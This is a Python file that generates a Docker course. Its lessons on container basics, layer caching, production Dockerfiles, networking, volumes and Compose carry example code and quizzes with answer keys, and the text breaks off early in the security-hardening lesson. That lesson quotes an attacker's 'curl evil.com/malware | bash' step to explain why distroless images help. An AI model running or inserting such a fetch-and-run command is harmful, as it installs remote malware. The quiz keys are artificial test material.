import os
import sys
sys.path.append(os.path.dirname(__file__))
from helpers import build_lesson, save_course

# ==============================================================================
# COURSE 96: docker-containers (Docker & Containers)
# ==============================================================================
def make_course_96():
    lessons = [
        build_lesson(
            1, "the-container-revolution-it-works-on-my-machine", "The Container Revolution: 'It Works on My Machine' No More", "Container Revolution",
            "The packaging revolution: why traditional deployment failed, Linux cgroups and namespaces, and containers vs virtual machines.",
            "What core software problem does containerization with Docker solve?",
            ["The 'it works on my machine' defect: packaging application code together with its exact runtime, OS dependencies, and system libraries into an immutable, portable artifact", "It makes computers run without electricity", "It translates Python into C", "It replaces the internet"],
            0, "Containers package code, runtimes, and dependencies together, guaranteeing identical execution across development and production.",
            [
                "<p>Before containers, deploying software was a nightmare. An engineer developed an app on macOS with Python 3.11 and libssl 1.1. They deployed it to an Ubuntu 20.04 server with Python 3.8 and libssl 1.0, and <strong>everything crashed</strong> with missing shared libraries or obscure environment conflicts.</p>",
                "<p>How <strong>Containers</strong> solve environment drift:</p>",
                "<ul><li><strong>1. The Container Artifact:</strong> A container packages your application code, Python interpreter, system packages (`apt/apk`), and configuration into an immutable image. It runs bit-for-bit identically on your laptop, CI/CD runners, and AWS production clusters!</li><li><strong>2. Containers vs Virtual Machines (VMs):</strong> VMs virtualize full hardware and run a complete guest operating system (heavy, 10-30GB, minutes to boot). Containers share the host Linux kernel, using <strong>Linux Namespaces</strong> (for process/network isolation) and <strong>cgroups</strong> (for CPU/memory resource limits). Lightweight, 50MB, boots in <strong>100 milliseconds</strong>!</li><li><strong>3. Process Isolation:</strong> A container is not a mini-computer; it is simply a standard Linux process running with an isolated filesystem, private network stack, and bounded resource limits.</li></ul>",
                "<pre><code># The Difference Between VMs and Containers:\n# VIRTUAL MACHINE (Heavy): \n# [App] -> [Bins/Libs] -> [Guest OS (Ubuntu)] -> [Hypervisor] -> [Host OS] -> [Hardware]\n#\n# DOCKER CONTAINER (Lightweight & Fast):\n# [App] -> [Bins/Libs] -> [Docker Engine] -> [Shared Host Linux Kernel] -> [Hardware]</code></pre>",
                "<div class=\"callout\"><p><strong>The Container Epiphany:</strong> A container is not a virtual machine. It is a native host process running inside an isolated namespace with an isolated filesystem.</p></div>"
            ],
            "Virtual Machines vs Containers", "Hypervisor virtualization vs kernel namespaces",
            [
                {"title": "Virtual Machine (VM)", "lines": ["Full guest OS per VM (Ubuntu, Windows)", "Heavy size: 10GB-50GB | Slow boot: 1-3 mins", "High RAM & CPU virtualization overhead"]},
                {"title": "Docker Container", "lines": ["Shares host Linux kernel (Namespaces & cgroups)", "Lightweight size: 50MB-500MB | Boots in 100ms", "Near-native bare-metal execution speed"]}
            ],
            "The 'It Works on My Machine' Solution", "Universal immutable artifacts",
            [
                {"title": "Developer Laptop (macOS)", "lines": ["Builds Docker image: tag v1.0"]},
                {"title": "Production Kubernetes (Linux)", "lines": ["Pulls and runs exact same tag v1.0", "Guaranteed 100% identical runtime behavior!"]}
            ],
            "Complete the container revolution sentence",
            "Containers achieve lightweight isolation by sharing the host Linux kernel using {1} for process isolation and {2} for CPU and memory resource limits.",
            [
                {"answer": "namespaces", "hint": "Linux process and network isolation boundary", "options": ["namespaces", "keyboards", "monitors"]},
                {"answer": "cgroups", "hint": "Control Groups for hardware resource caps", "options": ["cgroups", "compilations", "formats"]}
            ],
            [
                {"q": "What two underlying Linux kernel features make Docker containers possible?",
                 "a": ["Namespaces (for isolating processes, networks, and mount points) and cgroups (for limiting CPU and memory usage)", "Hypervisors and BIOS", "NTFS and FAT32", "OpenGL and DirectX"],
                 "c": 0, "why": "Linux namespaces provide process isolation, while cgroups (control groups) enforce hardware resource boundaries."},
                {"q": "Why do Docker containers start in hundreds of milliseconds compared to minutes for Virtual Machines?",
                 "a": ["Containers do not boot a full guest operating system; they execute directly as native processes on the already-running host kernel", "Containers use special hardware", "Containers run without memory", "Containers use quantum computing"],
                 "c": 0, "why": "Bypassing guest OS kernel boot allows containers to launch almost instantaneously."},
                {"q": "What is a 'Docker Image'?",
                 "a": ["An immutable, read-only template composed of layered filesystem snapshots that defines the environment to create a running container", "A JPEG picture of a whale", "A video file of a software demo", "A screenshot of a desktop"],
                 "c": 0, "why": "Images are the immutable build artifacts from which active container instances are instantiated."},
                {"q": "How does packaging dependencies inside a Docker image prevent production deployment failures?",
                 "a": ["It eliminates reliance on pre-installed system packages or libraries on the host server; all required dependencies are packaged inside the image", "It rewrites all code in Rust", "It makes servers immune to power outages", "It connects directly to the satellite"],
                 "c": 0, "why": "Self-contained dependency packaging guarantees environmental consistency across all deployment targets."}
            ],
            "You understand the container revolution, kernel namespaces, and the difference between VMs and containers.",
            "Images and the Union File System: Layer Caching", "Master Docker layer caching to accelerate builds from minutes to seconds."
        ),
        build_lesson(
            2, "images-union-filesystem-layer-caching", "Images and the Union File System: Layer Caching", "Layer Caching",
            "Inside Docker images: Union File Systems (OverlayFS), immutable image layers, Docker build cache mechanics, and cache busting.",
            "Why is ordering instructions properly in a Dockerfile critical for build performance?",
            ["Docker caches each build instruction as an image layer; ordering frequently changing files (like source code) after stable files (like dependencies) enables fast cache hits", "Wrong order causes the hard drive to crash", "Docker requires alphabetical order", "Order changes the color of the image"],
            0, "Docker invalidates cache layers from the point of change downward; putting dependencies before code preserves cache hits.",
            [
                "<p>A Docker image is not a single giant zip file. It is a stack of <strong>read-only immutable layers</strong> merged together using a <strong>Union File System (OverlayFS)</strong>. When you launch a container, Docker simply adds a thin, writable layer on top!</p>",
                "<p>How Docker Layer Caching Works:</p>",
                "<ul><li><strong>1. Instruction = Layer:</strong> Each command in your Dockerfile (`FROM`, `RUN`, `COPY`) creates a cached filesystem diff layer.</li><li><strong>2. Downward Cache Invalidation:</strong> When Docker builds an image, it checks if the instruction and its input files have changed. If a layer changes, <strong>that layer and ALL subsequent layers are invalidated and must be rebuilt!</strong></li><li><strong>3. The Anti-Pattern:</strong> Copying your entire source code directory before running `pip install`! Every time you edit 1 line of Python, Docker is forced to re-download all 50 dependencies for 3 minutes!</li><li><strong>4. The Cache-Optimized Pattern:</strong> Copy only `requirements.txt` first, run `pip install`, and <em>only then</em> copy your application source code! Dependency installation is cached in <strong>0.1 seconds</strong>!</li></ul>",
                "<pre><code># CACHE-OPTIMIZED DOCKERFILE:\nFROM python:3.12-slim\nWORKDIR /app\n\n# 1. Copy dependencies FIRST (rarely changes -> 100% CACHE HIT!):\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\n# 2. Copy source code LAST (frequently changes -> Fast layer rebuild!):\nCOPY . .\n\nCMD [\"python\", \"main.py\"]</code></pre>",
                "<div class=\"callout\"><p><strong>The Build Optimization Rule:</strong> Order Dockerfile instructions from least-frequently changing (base OS, system tools, dependencies) to most-frequently changing (app code). Builds drop from 4 minutes to 3 seconds.</p></div>"
            ],
            "Docker Layer Invalidation Cascade", "How order dictates build caching efficiency",
            [
                {"title": "Unoptimized (Slow: 3 mins)", "lines": ["COPY . . (Code changes every commit)", "RUN pip install (Cache broken! Re-downloads all 50 packages every time)"]},
                {"title": "Optimized (Fast: 2 secs)", "lines": ["COPY requirements.txt .", "RUN pip install (Cached in 0.1s!)", "COPY . . (Only fast app code layer rebuilt!)"]}
            ],
            "OverlayFS Layer Stacking", "Merging read-only snapshots with a writable container layer",
            [
                {"title": "Top: Writable Container Layer", "lines": ["Ephemeral in-memory diffs created during execution"]},
                {"title": "Layer 3: Application Code", "lines": ["Read-only snapshot of src/"]},
                {"title": "Layer 2: Python Dependencies", "lines": ["Read-only snapshot of site-packages/"]},
                {"title": "Layer 1: Base Linux OS", "lines": ["Read-only python:3.12-slim foundation"]}
            ],
            "Complete the layer caching sentence",
            "Docker images use Union File Systems where each instruction creates a cached layer, requiring developers to place stable {1} before frequently edited {2} to maximize cache hits.",
            [
                {"answer": "dependencies", "hint": "External packages and libraries", "options": ["dependencies", "voltages", "hardware"]},
                {"answer": "code", "hint": "Application source files", "options": ["code", "keyboards", "monitors"]}
            ],
            [
                {"q": "What happens to Docker's build cache if an instruction on Line 4 of a Dockerfile changes?",
                 "a": ["Line 4 and every subsequent instruction below it are invalidated and must be completely re-executed from scratch", "Only Line 4 is rebuilt; lines below remain cached", "The build fails with a syntax error", "Docker restarts the computer"],
                 "c": 0, "why": "Docker layer caching is sequential; any change invalidates all downstream dependent layers."},
                {"q": "Why is adding '--no-cache-dir' recommended when running 'pip install' inside a Dockerfile?",
                 "a": ["It prevents pip from caching wheel files inside the image layer, shrinking final Docker image size significantly", "It makes pip install run 10x faster", "Pip cannot cache files on Linux", "It is required by Python syntax"],
                 "c": 0, "why": "Disabling pip's local wheel cache avoids baking redundant installer tarballs into the image layer."},
                {"q": "What is 'OverlayFS' in Linux container runtimes?",
                 "a": ["A Union File System that stacks multiple read-only directory trees into a single merged unified filesystem view", "A network file transfer protocol", "A hard drive formatting utility", "A video overlay software"],
                 "c": 0, "why": "OverlayFS merges underlying read-only image layers with an active writable container layer."},
                {"q": "How does using a '.dockerignore' file accelerate Docker build times?",
                 "a": ["It prevents large, unnecessary local files (.git, node_modules, __pycache__, temp files) from being transferred into the Docker build context", "It ignores all syntax errors", "It deletes unnecessary code", "It speeds up internet Wi-Fi"],
                 "c": 0, "why": "Excluding local caches and .git repositories minimizes the build context sent to the Docker daemon."}
            ],
            "You know how the Union File System works and how to design Dockerfiles for lightning-fast layer caching.",
            "Writing Production Dockerfiles: Multi-Stage Builds & Non-Root Users", "Author minimal, secure, and production-hardened container images."
        ),
        build_lesson(
            3, "production-dockerfiles-multistage-nonroot", "Writing Production Dockerfiles: Multi-Stage Builds & Non-Root Users", "Production Dockerfiles",
            "Container hardening: Multi-stage builds (compiler vs runtime), non-root users (`USER appuser`), and shrinking image sizes from 1.5GB to 80MB.",
            "What is a 'Multi-Stage Build' in Docker, and why is it essential for production containers?",
            ["A pattern using multiple FROM statements to separate build-time compilers and SDKs from the final runtime image, resulting in tiny, secure production artifacts", "Building an image on multiple computers", "A Dockerfile written in two languages", "Running multiple containers at once"],
            0, "Multi-stage builds compile artifacts in a heavy builder stage, copying only binary outputs into a lean, secure runtime image.",
            [
                "<p>A naive Docker image for a Python or Go application is often <strong>1.5 Gigabytes</strong> in size. Why? Because it includes compilers (`gcc`, `g++`), build SDKs, header files, package managers, and shell utilities that are needed to build the app, but completely useless at runtime. Heavy images are slow to pull and full of vulnerable CVEs.</p>",
                "<p>The Two Pillars of <strong>Production Dockerfiles</strong>:</p>",
                "<ul><li><strong>1. Multi-Stage Builds (Shrink Image by 90%):</strong><ul><li><em>Stage 1 (The Builder):</em> Uses a full build image (`python:3.12`) to compile C-extensions, build wheels, and run linters.</li><li><em>Stage 2 (The Final Runtime):</em> Uses a minimal, stripped-down base (`python:3.12-slim` or `distroless`). It copies <strong>only the compiled wheels and app code</strong> from Stage 1! Compilers and package managers are left behind.</li></ul></li><li><strong>2. Non-Root Execution (`USER nonroot`):</strong> By default, containers run as `root` (UID 0). If an attacker achieves Remote Code Execution (RCE) in your app, they have root privileges! Always create and switch to an unprivileged user: <code>USER appuser</code>.</li></ul>",
                "<pre><code># PRODUCTION-GRADE MULTI-STAGE DOCKERFILE:\n# Stage 1: Build & Compile\nFROM python:3.12-slim AS builder\nWORKDIR /build\nRUN apt-get update && apt-get install -y --no-install-recommends gcc build-essential\nCOPY requirements.txt .\nRUN pip wheel --no-cache-dir --wheel-dir=/build/wheels -r requirements.txt\n\n# Stage 2: Final Secure Runtime (85MB! Zero Compilers!)\nFROM python:3.12-slim\nWORKDIR /app\n# Create unprivileged non-root user\nRUN groupadd -r appgroup && useradd -r -g appgroup -u 1000 appuser\n# Copy only compiled wheels from builder stage\nCOPY --from=builder /build/wheels /wheels\nRUN pip install --no-cache /wheels/* && rm -rf /wheels\nCOPY --chown=appuser:appgroup . .\n# Switch away from root!\nUSER appuser\nCMD [\"python\", \"main.py\"]</code></pre>",
                "<div class=\"callout\"><p><strong>The Non-Root Rule:</strong> Never run a production container as root. A simple <code>USER 1000</code> directive neuters 80% of container escape and filesystem takeover exploits.</p></div>"
            ],
            "Multi-Stage Build Pattern", "Decoupling compilation from runtime execution",
            [
                {"title": "Stage 1: Builder (Heavy: 1.2GB)", "lines": ["gcc, make, dev headers, pip wheels", "Compiles code and builds dependencies", "Completely discarded after build!"]},
                {"title": "Stage 2: Final Runtime (Lean: 75MB)", "lines": ["Copies ONLY compiled wheel binaries & code", "Zero compilers, zero build tools", "Tiny attack surface, blazingly fast pulls!"]}
            ],
            "Root vs Non-Root Execution", "Limiting remote code execution impact",
            [
                {"title": "Default: USER root (UID 0)", "lines": ["Exploit gives attacker full root control", "High container escape risk"]},
                {"title": "Hardened: USER appuser (UID 1000)", "lines": ["Attacker confined to unprivileged user", "Cannot alter system packages or kernel"]}
            ],
            "Complete the production Dockerfile sentence",
            "Multi-stage Docker builds leave compilers behind in the builder stage to create tiny runtime images, while switching to an unprivileged {1} user prevents {2} escalation.",
            [
                {"answer": "non-root", "hint": "User with UID 1000 rather than root", "options": ["non-root", "admin", "virtual"]},
                {"answer": "privilege", "hint": "Unauthorized administrative takeover", "options": ["privilege", "formatting", "licensing"]}
            ],
            [
                {"q": "What is the primary security benefit of multi-stage Docker builds?",
                 "a": ["Build tools, compilers (like gcc), and dev dependencies are omitted from the final image, radically shrinking the attack surface and reducing vulnerable CVEs", "Multi-stage builds make images encrypted", "Compilers are illegal in production", "It speeds up Python code"],
                 "c": 0, "why": "Excluding compilers removes tools attackers could use to compile exploits inside the container."},
                {"q": "Why is running a container as UID 0 (root) a major security hazard?",
                 "a": ["If an attacker compromises the application process, they possess root privileges inside the container, increasing the risk of kernel escape to the host", "Root containers use double the RAM", "Root containers cannot connect to databases", "Root containers run in debug mode"],
                 "c": 0, "why": "Root processes have elevated authority, maximizing damage if the application is compromised."},
                {"q": "What Dockerfile instruction switches execution to an unprivileged user?",
                 "a": ["USER <username_or_uid>", "RUN sudo user", "SWITCH user", "ENV USER=app"],
                 "c": 0, "why": "The USER directive sets the UID/GID for all subsequent RUN, CMD, and ENTRYPOINT instructions."},
                {"q": "What is the '--chown' flag used for in COPY instructions (e.g. COPY --chown=appuser:appgroup . .)?",
                 "a": ["It sets the file ownership to the unprivileged user at copy time, preventing permission denied errors when the non-root user runs", "It compresses the files", "It encrypts the copied files", "It verifies file checksums"],
                 "c": 0, "why": "Setting ownership during COPY ensures the non-root user can read and execute application files."}
            ],
            "You know how to author production Dockerfiles using multi-stage builds and non-root users.",
            "Container Networking: Port Mapping, Bridge Networks, and DNS", "Connect containers securely using user-defined bridge networks and internal DNS."
        ),
        build_lesson(
            4, "container-networking-bridge-dns-ports", "Container Networking: Port Mapping, Bridge Networks, and DNS", "Container Networking",
            "Inter-container communication: port publishing (`-p host:container`), user-defined bridge networks, container DNS resolution, and network isolation.",
            "How do containers on the same user-defined Docker bridge network discover and communicate with each other?",
            ["Docker provides an automatic internal DNS resolver that maps container names (e.g. 'postgres' or 'backend') directly to their internal IP addresses", "Containers send physical radio signals", "Containers must hardcode each other's MAC addresses", "Containers communicate through browser cookies"],
            0, "Docker's embedded DNS server enables automatic service discovery by container name on user-defined bridge networks.",
            [
                "<p>Containers operate with their own isolated network namespaces, virtual network interfaces (`eth0`), and private IP routing tables. Understanding how packets travel between your host, external clients, and sibling containers is foundational to distributed systems.</p>",
                "<p>The Core Mechanics of <strong>Container Networking</strong>:</p>",
                "<ul><li><strong>1. Port Mapping (`-p 8080:80`):</strong> Connects the host to the container. The host listens on port `8080` and uses iptables/NAT to forward packets into port `80` inside the container. <em>Never expose internal databases to the host!</em></li><li><strong>2. User-Defined Bridge Networks:</strong> When you create a custom bridge (`docker network create app-net`), Docker isolates all attached containers from external traffic.</li><li><strong>3. Embedded Container DNS:</strong> On a user-defined network, Docker runs an internal DNS server (`127.0.0.11`). Your Python app connects to PostgreSQL simply using the hostname: <code>db = connect(\"postgres://user:pass@postgres_db:5432/app\")</code>! Zero hardcoded IPs!</li><li><strong>4. Complete Network Isolation:</strong> Containers on `network-frontend` cannot physically route packets to containers on `network-backend` unless a container is explicitly attached to both!</li></ul>",
                "<pre><code># Container Networking in Action (CLI):\n# 1. Create isolated internal bridge network\ndocker network create internal-tier\n\n# 2. Launch database (Notice: NO -p port mapping! NOT exposed to internet!)\ndocker run -d --name db_service --network internal-tier postgres:16-alpine\n\n# 3. Launch backend API on same network (Resolves db_service via internal DNS!)\ndocker run -d -p 8000:8000 --name api_service --network internal-tier \\\n    -e DATABASE_URL=\"postgres://db_service:5432/prod\" my-api:latest\n# API is reachable from host on port 8000, but database is 100% private!</code></pre>",
                "<div class=\"callout\"><p><strong>The Exposure Rule:</strong> Only publish ports (`-p`) on internet-facing ingress containers. Internal microservices, caches, and databases should communicate exclusively over internal Docker bridge networks without host port exposure.</p></div>"
            ],
            "Container DNS Resolution Flow", "Resolving container names on user-defined networks",
            [
                {"title": "Backend API Container", "lines": ["Connects to host: 'db_service:5432'", "Queries embedded DNS (127.0.0.11)"]},
                {"title": "Docker Embedded DNS", "lines": ["Resolves 'db_service' -> 172.18.0.3", "Routes packet across internal bridge"]},
                {"title": "PostgreSQL Container", "lines": ["Receives query safely on private IP", "Zero ports exposed to public host!"]}
            ],
            "Public Ingress vs Private Backend", "Network isolation topology",
            [
                {"title": "Internet -> Host:8000 -> API Container", "lines": ["Published via -p 8000:8000"]},
                {"title": "API Container -> Database Container", "lines": ["Private internal bridge network only!"]}
            ],
            "Complete the container networking sentence",
            "Docker user-defined bridge networks provide automatic service discovery by container name using embedded {1}, allowing private communication without host {2} mapping.",
            [
                {"answer": "DNS", "hint": "Domain Name System resolution", "options": ["DNS", "HTML", "RAM"]},
                {"answer": "port", "hint": "Host-to-container port publishing (-p)", "options": ["port", "formatting", "licensing"]}
            ],
            [
                {"q": "What is the difference between '-p 8080:80' and '--expose 80' in Docker?",
                 "a": ["-p 8080:80 binds host port 8080 and forwards external traffic into container port 80; --expose 80 is purely documentation and opens no host ports", "-p is for Python; expose is for Java", "--expose publishes to the entire internet", "They are identical flags"],
                 "c": 0, "why": "-p creates active iptables port forwarding on the host; EXPOSE is advisory metadata."},
                {"q": "Why is automatic DNS resolution by container name NOT supported on Docker's default 'bridge' network?",
                 "a": ["Docker legacy design only enables embedded DNS resolution on custom 'user-defined' bridge networks for security and isolation", "Default bridges cannot use IP addresses", "Default bridges run without memory", "DNS is illegal on default bridges"],
                 "c": 0, "why": "Automatic DNS resolution requires creating a user-defined bridge network (or using Docker Compose)."},
                {"q": "Why should database containers in production environments avoid using '-p 5432:5432' host port publishing?",
                 "a": ["Publishing the port binds the database to host network interfaces, potentially exposing it to the public internet or local network attackers", "It slows down database queries", "Postgres refuses to run with -p", "It consumes too much bandwidth"],
                 "c": 0, "why": "Databases should communicate over internal container networks, keeping host ports closed."},
                {"q": "What special IP address does Docker assign to its embedded internal DNS resolver inside containers?",
                 "a": ["127.0.0.11", "8.8.8.8", "1.1.1.1", "192.168.1.1"],
                 "c": 0, "why": "Docker's embedded DNS server listens on loopback address 127.0.0.11 inside container namespaces."}
            ],
            "You know how to configure Docker bridge networks, port publishing, and internal DNS resolution.",
            "Persistent Storage: Bind Mounts vs Named Volumes", "Manage persistent data across container lifecycles."
        ),
        build_lesson(
            5, "persistent-storage-bind-mounts-named-volumes", "Persistent Storage: Bind Mounts vs Named Volumes", "Storage & Volumes",
            "Data persistence: why containers are ephemeral by default, Named Volumes (managed by Docker), and Bind Mounts (local directories).",
            "What happens to data written inside a container's writable filesystem layer when the container is removed (`docker rm`)?",
            ["All data written inside the container layer is permanently deleted and lost, unless persistent volumes or bind mounts were attached", "The data is saved to the desktop", "The data is automatically uploaded to AWS", "The container cannot be deleted if it has data"],
            0, "Container filesystems are ephemeral by default; persistent data must be stored in Docker volumes or bind mounts.",
            [
                "<p>By default, containers are <strong>ephemeral and stateless</strong>. If you run a PostgreSQL container, insert 10,000 customers, and run `docker rm -f pg_container`, <strong>all your data is gone forever</strong>. The container's writable layer is destroyed along with the container.</p>",
                "<p>The Two Storage Paradigms in Docker:</p>",
                "<ul><li><strong>1. Named Volumes (Production Standard — Managed by Docker):</strong> Docker manages a dedicated storage area on the host filesystem (`/var/lib/docker/volumes/`). Volumes are independent of container lifecycles: you can delete, upgrade, or replace the container, and mount the volume to a new container with <strong>zero data loss</strong>! High performance on all OSs.</li><li><strong>2. Bind Mounts (Local Development Standard):</strong> Mounts an exact directory on your host laptop directly into the container: `-v $(pwd):/app`. When you edit code in VS Code, the container sees the changes instantly (live reload!). Slower on macOS/Windows due to filesystem translation.</li><li><strong>3. In-Memory tmpfs Mounts:</strong> Mounts temporary storage in host RAM (`--tmpfs /tmp`). Never written to disk; wiped on stop. Ideal for sensitive secrets or fast temp caches!</li></ul>",
                "<pre><code># Persistent Database using Named Volumes (CLI):\n# 1. Create a persistent named volume:\ndocker volume create pg_data\n\n# 2. Mount named volume to PostgreSQL data directory:\ndocker run -d \\\n    --name prod_db \\\n    -v pg_data:/var/lib/postgresql/data \\\n    postgres:16-alpine\n# Even if prod_db is deleted and upgraded to postgres:17, pg_data remains 100% intact!</code></pre>",
                "<div class=\"callout\"><p><strong>The Golden Storage Rule:</strong> Use <strong>Bind Mounts</strong> for active local code editing during development; use <strong>Named Volumes</strong> for persistent databases and state in production.</p></div>"
            ],
            "Bind Mounts vs Named Volumes", "Host-relative directories vs Docker-managed storage",
            [
                {"title": "Bind Mounts (-v /host/path:/container/path)", "lines": ["Mounts exact host folder into container", "Perfect for local dev & live reloading (hot-reload)", "Tied to specific host directory structure"]},
                {"title": "Named Volumes (-v my_data:/var/lib/data)", "lines": ["Managed by Docker in /var/lib/docker/volumes", "Completely decoupled from container lifecycle", "Gold standard for production databases & state"]}
            ],
            "Data Persistence Guarantee", "Containers die, volumes survive",
            [
                {"title": "Container Lifecycle", "lines": ["docker run -> Write data -> docker rm (Container destroyed)"]},
                {"title": "Volume Lifecycle", "lines": ["Volume survives unchanged -> Mounted to v2 container!"]}
            ],
            "Complete the persistent storage sentence",
            "Containers are ephemeral by default, requiring {1} mounts for local code live-reloading and Docker-managed named {2} for production database persistence.",
            [
                {"answer": "bind", "hint": "Host-relative directory mount", "options": ["bind", "voltage", "format"]},
                {"answer": "volumes", "hint": "Docker-managed storage pools", "options": ["volumes", "keyboards", "monitors"]}
            ],
            [
                {"q": "Why are Named Volumes preferred over Bind Mounts for production database deployments?",
                 "a": ["Volumes are managed entirely by Docker, isolated from host OS directory structure differences, and offer optimized I/O performance", "Named volumes are encrypted by default", "Bind mounts cannot store databases", "Named volumes run in memory only"],
                 "c": 0, "why": "Named volumes are platform-agnostic, decoupled from host filesystem layouts, and fully managed by Docker."},
                {"q": "What is the primary benefit of using a Bind Mount during local web development?",
                 "a": ["Changes made to source code files on the host computer are reflected inside the container instantly without rebuilding the image", "It speeds up Python execution by 10x", "It makes Docker images smaller", "It compiles code to C"],
                 "c": 0, "why": "Bind mounts mirror host files into the container, enabling instant hot-reloading during development."},
                {"q": "Where does Docker store Named Volumes on a Linux host by default?",
                 "a": ["Under /var/lib/docker/volumes/", "Inside the user's home Documents folder", "On the desktop", "In /tmp"],
                 "c": 0, "why": "Docker maintains its managed volumes in the /var/lib/docker/volumes directory on Linux hosts."},
                {"q": "What does a 'tmpfs' mount do in Docker?",
                 "a": ["Mounts an ephemeral storage volume directly in host RAM that is never written to physical disk and is cleared when the container stops", "Formats the hard drive", "Stores files in the cloud", "Compresses image layers"],
                 "c": 0, "why": "tmpfs mounts store data in host memory only, ensuring high-speed access and zero disk persistence."}
            ],
            "You know how to manage persistent data using Bind Mounts, Named Volumes, and tmpfs.",
            "Multi-Container Orchestration with Docker Compose", "Define and orchestrate multi-service application stacks with a single command."
        ),
        build_lesson(
            6, "multi-container-docker-compose", "Multi-Container Orchestration with Docker Compose", "Docker Compose",
            "Orchestrating microservices: compose.yaml specifications, service dependencies (`depends_on`), environment interpolation, and network topologies.",
            "What is 'Docker Compose' and why is it standard for local multi-service development?",
            ["A tool for defining and running multi-container Docker applications using a declarative YAML file with a single command (`docker compose up`)", "A tool for making music with computers", "A compiler for Dockerfiles", "A cloud hosting provider"],
            0, "Docker Compose orchestrates multi-container applications (backend, frontend, database, Redis) using a single declarative YAML file.",
            [
                "<p>Typing four separate `docker run` commands with 15 flags every morning to start your web app, PostgreSQL, Redis, and Celery worker is tedious and error-prone. <strong>Docker Compose</strong> provides declarative, version-controlled multi-container orchestration.</p>",
                "<p>Key Features of Docker Compose (`compose.yaml`):</p>",
                "<ul><li><strong>1. Declarative Stack Definition:</strong> Define all services, build targets, environment variables, ports, and volumes in a single `compose.yaml` file checked into git.</li><li><strong>2. Automatic Bridge Network:</strong> Compose automatically creates a shared private bridge network for the stack. Services communicate using their service names as DNS hostnames (`http://api:8000`, `postgres:5432`)!</li><li><strong>3. Startup Order & Healthchecks (`depends_on`):</strong> Ensure your API doesn't start until PostgreSQL is not just running, but <strong>healthy and ready to accept connections</strong>!</li><li><strong>4. One-Command Lifecycle:</strong> `docker compose up -d` launches the entire stack in the background; `docker compose down` stops and cleans up everything cleanly.</li></ul>",
                "<pre><code># Production-Ready compose.yaml Example:\nservices:\n  web:\n    build: .\n    ports:\n      - \"8000:8000\"\n    environment:\n      - DATABASE_URL=postgres://app:secret@db:5432/app_db\n      - REDIS_URL=redis://cache:6379/0\n    depends_on:\n      db:\n        condition: service_healthy # Waits for healthcheck to PASS!\n      cache:\n        condition: service_started\n\n  db:\n    image: postgres:16-alpine\n    environment:\n      - POSTGRES_USER=app\n      - POSTGRES_PASSWORD=secret\n      - POSTGRES_DB=app_db\n    volumes:\n      - pgdata:/var/lib/postgresql/data\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U app\"]\n      interval: 5s\n      timeout: 5s\n      retries: 5\n\n  cache:\n    image: redis:7-alpine\n\nvolumes:\n  pgdata: # Named volume for persistent database storage!</code></pre>",
                "<div class=\"callout\"><p><strong>The Healthcheck Condition:</strong> Never use a bare <code>depends_on: [db]</code>. A database container reports 'started' in 50ms, but takes 3 seconds to initialize. Always use <code>condition: service_healthy</code>.</p></div>"
            ],
            "The Docker Compose Architecture", "Declarative multi-service application stack",
            [
                {"title": "Service: web", "lines": ["Builds local Dockerfile", "Maps port 8000:8000", "Depends on healthy database"]},
                {"title": "Service: db (Postgres)", "lines": ["Uses postgres:16-alpine", "Persistent named volume (pgdata)", "Healthcheck: pg_isready"]},
                {"title": "Service: cache (Redis)", "lines": ["In-memory cache for sessions & rate limits"]}
            ],
            "Single Command Lifecycle", "Automating developer environments",
            [
                {"title": "docker compose up -d", "lines": ["Creates network, volumes, and starts all 3 services!"]},
                {"title": "docker compose down", "lines": ["Gracefully stops and removes all containers & networks"]}
            ],
            "Complete the Docker Compose sentence",
            "Docker Compose orchestrates multi-container applications declaratively, using {1} conditions to ensure applications wait for databases to become {2}.",
            [
                {"answer": "healthcheck", "hint": "Status probe verifying readiness", "options": ["healthcheck", "formatting", "licensing"]},
                {"answer": "healthy", "hint": "Ready to accept incoming connections", "options": ["healthy", "compiled", "encrypted"]}
            ],
            [
                {"q": "What happens if a backend service uses 'depends_on: [db]' without a healthcheck condition?",
                 "a": ["The backend starts as soon as the database process launches, often crashing because the database is still initializing and not yet ready to accept connections", "The database is deleted", "The build hangs forever", "Docker crashes"],
                 "c": 0, "why": "Containers report started before internal daemons are ready; healthcheck conditions ensure readiness."},
                {"q": "What command stops all containers defined in a Compose file and removes the internal network?",
                 "a": ["docker compose down", "docker stop all", "docker kill", "docker purge"],
                 "c": 0, "why": "docker compose down gracefully terminates containers, removes networks, and cleans up the stack."},
                {"q": "How do environment variables in a local '.env' file interact with Docker Compose by default?",
                 "a": ["Compose automatically reads the .env file in the project root and interpolates variable values (${DATABASE_URL}) into compose.yaml", "Compose deletes the .env file", "Compose ignores .env files", "Compose converts .env to JSON"],
                 "c": 0, "why": "Docker Compose automatically parses .env files for variable substitution in compose.yaml."},
                {"q": "What flag is passed to 'docker compose up' to run all containers in the background as detached daemons?",
                 "a": ["-d (or --detach)", "-b", "-bg", "--daemon"],
                 "c": 0, "why": "The -d flag runs containers in the background, freeing the terminal prompt."}
            ],
            "You know how to define, orchestrate, and manage multi-service application stacks with Docker Compose.",
            "Container Security Hardening: Distroless, Capabilities, and Scanning", "Harden containers against vulnerabilities and kernel escape exploits."
        ),
        build_lesson(
            7, "container-security-distroless-scanning", "Container Security Hardening: Distroless, Capabilities, and Scanning", "Container Hardening",
            "Enterprise container security: Distroless base images (GoogleContainerTools), dropping Linux capabilities (`cap-drop ALL`), and image vulnerability scanning (Trivy).",
            "What is a 'Distroless' container image, and why does it represent the pinnacle of container security?",
            ["An image that contains only the application and its runtime dependencies, containing ZERO package managers (apt), ZERO shells (bash/sh), and ZERO OS utilities", "An image that runs without a computer", "An image without a Dockerfile", "A broken Linux distribution"],
            0, "Distroless images contain no shells, package managers, or utilities, making it nearly impossible for attackers to run shell scripts or tools.",
            [
                "<p>If an attacker achieves Remote Code Execution (RCE) in an application running on Ubuntu, their first action is running `curl evil.com/malware | bash`. But what if there is <strong>no bash, no sh, no curl, and no package manager inside the container</strong>? The attacker is completely neutralized.</p>",
                "<p>Three Pillars of <strong>Container Security Hardening</strong>:</p>",
